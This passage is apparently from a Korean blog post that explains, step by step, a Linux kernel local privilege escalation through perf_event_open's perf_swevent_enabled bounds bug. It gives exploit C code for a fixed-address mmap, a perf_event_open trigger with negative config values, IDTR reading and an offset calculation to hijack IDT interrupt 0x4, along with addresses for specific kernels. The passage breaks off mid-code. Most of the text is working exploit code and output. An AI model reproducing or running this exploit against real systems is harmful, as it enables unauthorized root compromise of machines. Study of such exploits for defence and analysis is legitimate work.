<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define BASE        0x380000000</span>
</span><span class='line'><span class="cp">#define SIZE        0x010000000 </span><span class="c1">// 256 megabytes</span>
</span><span class='line'><span class="cp">#define KSIZE       0x002000000 </span><span class="c1">// 32 megabytes</span>
</span><span class='line'><span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">BASE</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
</span><span class='line'>                <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span>
</span><span class='line'>                <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>                <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">BASE</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;mmap was unable to get fixed address: %lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">BASE</span><span class="p">);</span>
</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>BASE 가 <code>0x380000000</code> 로 잡힌 이유는</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">boot</span><span class="o">/</span><span class="n">System</span><span class="p">.</span><span class="n">map</span><span class="o">-</span><span class="mf">2.6.32</span><span class="o">-</span><span class="mf">358.</span><span class="n">el6</span><span class="p">.</span><span class="n">x86_64</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">perf_swevent_enabled</span>
</span><span class='line'><span class="n">ffffffff81f360c0</span> <span class="n">B</span> <span class="n">perf_swevent_enabled</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>perf_swevent_enabled array 가 0xffffffff81f360c0 이고.</p></li>
<li><p>config 로 -1 을 던지면, dec 는 0x0000000381F360bc 에 동작하게되고.</p></li>
</ul>


<p><code>0xffFFffFF * 4 + 0xffFFffFF81f360C0 == 0x0000000381F360bc</code></p>

<ul>
<li>config 를 -2 로 던지면, dec 는 0x0000000381F360b8 에 가게된다.</li>
</ul>


<p>그러니까 memory region 0x380000000 ~ 0x390000000 로 가면, config 를 -1,-2 로 던질때 dec 되는 address 를 커버한다.</p>

<h4>break_perf_event_open(-1)</h4>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="nf">break_perf_event_open</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">off</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">perf_event_attr</span> <span class="n">pea</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>        <span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">PERF_TYPE_SOFTWARE</span><span class="p">;</span>
</span><span class='line'>        <span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event_attr</span><span class="p">),</span>
</span><span class='line'>        <span class="p">.</span><span class="n">config</span> <span class="o">=</span> <span class="n">off</span><span class="p">,</span>
</span><span class='line'>        <span class="p">.</span><span class="n">mmap</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
</span><span class='line'>        <span class="p">.</span><span class="n">freq</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_perf_event_open</span><span class="p">,</span>
</span><span class='line'>                        <span class="o">&amp;</span><span class="n">pea</span><span class="p">,</span> <span class="c1">// struct perf_event_attr __user *attr_uptr</span>
</span><span class='line'>                        <span class="mi">0</span><span class="p">,</span> <span class="c1">// pid_t pid (target pid)</span>
</span><span class='line'>                        <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="c1">// int cpu (target cpu)</span>
</span><span class='line'>                        <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="c1">// int groud_fd (group leader fd)</span>
</span><span class='line'>                        <span class="mi">0</span><span class="p">);</span> <span class="c1">// unsigned long flags</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;perf_event_open&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;close&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Find the offset into the memory region where the write occurred</h4>

<p>이제 config -1 &amp; -2 로 dec 된 메모리를 찾는다.</p>

<p>i.e. <code>0x381f360b8</code>, <code>0x381f360bc</code> 가 dec 되야한다.</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">SIZE</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">map</span><span class="o">+</span><span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">tmp</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">tmp</span> <span class="o">+</span><span class="mi">1</span><span class="p">))</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>The Interrupt Descriptor Table (IDT)</h4>

<p>x86 아키텍쳐에서 인터럽트 벡터 테이블을 구현하기위한 데이터 구조. CPU 가 인터럽트나 익셉션에 대응하기 위해 필요하다. IDT 는 256 개의 벡터로 구성되어있다. IDT 는 물리 메모리 어디든 존재할 수 있는데, IDTR 이란는 특수 레지스터에 the physical base address / the length in bytes of the IDT 가 저장된다.</p>

<p>x86_64 에서는, 다음과 같이 나타낼 수 있다.</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idt</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<h4>IDTR</h4>

<p>64-bit IDT entry&rsquo;s handler offset 을 변경하는 것이 핵심이다.</p>

<p>일단 IDTR 을 찍어보면</p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="n">idtr</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="n">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idt</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">kbase</span><span class="p">;</span>
</span><span class='line'>    <span class="n">asm</span> <span class="nf">volatile</span> <span class="p">(</span><span class="s">&quot;sidt %0&quot;</span> <span class="o">:</span> <span class="s">&quot;=m&quot;</span> <span class="p">(</span><span class="n">idt</span><span class="p">));</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%016lx:%04x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">idt</span><span class="p">.</span><span class="n">limit</span><span class="p">);</span>
</span><span class='line'>    <span class="n">kbase</span> <span class="o">=</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%016lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">idtr</span>
</span><span class='line'><span class="nl">ffffffff81df8000</span><span class="p">:</span><span class="mf">0ff</span><span class="n">f</span>
</span><span class='line'><span class="mo">00000000</span><span class="mi">81000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>앞의 <code>0xffffffff</code> 에 increment 가 들어가서 <code>0x00000000</code> 으로 바뀌는게 exploit 의 핵심이다.</p>

<h4>Incrementing the address of an IDT handler</h4>

<p>공개된 exploit 에서는 interrupt 0x4 를 hijack 했다.</p>

<p><img src="/images/interrupts.png"></p>

<p>16-byte descriptor 구조를 보면,</p>

<p><img src="/images/id.png"></p>

<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">Offset</span>  <span class="n">Size</span>    <span class="n">Description</span>
</span><span class='line'><span class="mi">0</span>       <span class="mi">2</span>       <span class="n">Offset</span> <span class="n">low</span> <span class="n">bits</span> <span class="p">(</span><span class="mf">0..15</span><span class="p">)</span>
</span><span class='line'><span class="mi">2</span>       <span class="mi">2</span>       <span class="n">Selector</span> <span class="p">(</span><span class="n">Code</span> <span class="n">segment</span> <span class="n">selector</span><span class="p">)</span>
</span><span class='line'><span class="mi">4</span>       <span class="mi">1</span>       <span class="n">Zero</span>
</span><span class='line'><span class="mi">5</span>       <span class="mi">1</span>       <span class="n">Type</span> <span class="n">and</span> <span class="n">Attributes</span> <span class="p">(</span><span class="n">same</span> <span class="n">as</span> <span class="n">before</span><span class="p">)</span>
</span><span class='line'><span class="mi">6</span>       <span class="mi">2</span>       <span class="n">Offset</span> <span class="n">middle</span> <span class="n">bits</span> <span class="p">(</span><span class="mf">16..31</span><span class="p">)</span>
</span><span class='line'><span class="mi">8</span>       <span class="mi">4</span>       <span class="n">Offset</span> <span class="n">high</span> <span class="n">bits</span> <span class="p">(</span><span class="mf">32..63</span><span class="p">)</span>
</span><span class='line'><span class="mi">12</span>      <span class="mi">4</span>       <span class="n">Zero</span>
</span></code></pre></td></tr></table></div></figure>


<p>offset 8 의 경우, x86_64 에서 0xffFFffFF 가 될텐데, 이걸 atomic_inc() 시키는게 목표가 된다.</p>

<ol>
<li>0x4 번 인터럽트에 해당하는 interrupt descriptor 를 corrupt 시켜야하는데.</li>
<li>0,1,2,3 4*16 = 64. hex(64) = 0x40</li>
<li>offset 8 에 위치한 4 byte 를 atomic_inc() 시켜야하니까, 0x40 + offset 8 = 0x48</li>
<li>idt.addr + 0x48 부터 위치한 4 byte 에 atomic_inc() 가 들어가야한다.</li>
<li>나중에 <code>uint32_t *fixptr; fixptr = idt.addr + 0x48; *fixptr = -1</code> 로 원복이 들어가야한다.</li>
</ol>


<p>Ubuntu 12.04 에서</p>

<ol>
<li>idt.addr == 0xffffffff81df8000</li>
<li>perf_swevent_enabled == 0xffffffff81ef7160</li>
</ol>


<p>즉 idt.addr + 0x48 은 perf_swevent_enabled 앞에 위치함.</p>

<ol>
<li>target address 는 idt.addr + 0x48 (kernel 에 있음)</li>
<li>(perf_swevent_enabled - idt.addr - 0x48) / 4 하면 minus 로 얼마나 index 를 땡겨야하는지 나옴. perf_swevent_enabled(-index)</li>
<li>perf_swevent_enabled + (int64_t)0xffffffff * 4 == 0x380000000 + i*4 (overflow 나서)</li>
</ol>


<p>1+2+3 을 조합하면 break_perf_event_open() 에 negative 로 얼마를 줘야하는지 나옴.</p>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/perf_event.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;syscall.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;assert.h&gt;</span>
</span><span class='line'><span class="n">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">idt_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81df8000</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">target_addr</span> <span class="o">=</span> <span class="n">idt_addr</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">perf_swevent_enabled</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81ef7160</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">peek</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int32_t</span> <span class="n">idx32</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uidx64</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">idx64</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
</span><span class='line'>    <span class="n">peek</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;atomic_dec(): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">calc2</span>
</span><span class='line'><span class="n">atomic_dec</span><span class="p">()</span><span class="o">:</span> <span class="mh">0x381ef715c</span>
</span></code></pre></td></tr></table></div></figure>


<p>그럼 i 가 <code>0x381ef715c - 0x380000000 == 0x1ef715c</code> 에서 <code>0x1ef715c/4 == 0x7bdc57</code>라는 걸 알 수 있다.</p>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">break_perf_event_open</span><span class="p">(</span> <span class="o">-</span><span class="n">i</span> <span class="o">+</span> <span class="p">(((</span><span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x80000000</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>break_perf_event_open() 에 들어갈 값을 프로그램으로 검증해본다.</p>

<figure class='code'><figcaption><span>calc2.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">...</span>
</span><span class='line'><span class="n">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">idt_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81df8000</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">target_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">idt_addr</span> <span class="o">+</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0x48</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">perf_swevent_enabled</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff81ef7160</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">calc_perf</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">peek</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idt</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int32_t</span> <span class="n">idx32</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uidx64</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">idx64</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">map</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define BASE    0x380000000</span>
</span><span class='line'><span class="cp">#define SIZE    0x010000000 </span><span class="c1">// 256 mega</span>
</span><span class='line'><span class="cp">#define KSIZE   0x002000000 </span><span class="c1">// 32 mega</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">BASE</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
</span><span class='line'>            <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUSE</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">BASE</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;mmap error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
</span><span class='line'>    <span class="n">peek</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">idx64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;atomic_dec(): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">peek</span><span class="p">);</span>
</span><span class='line'>    <span class="o">*</span><span class="n">peek</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">config</span> <span class="o">=</span> <span class="mh">0xfffffffe</span><span class="p">;</span>
</span><span class='line'>    <span class="n">idx64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
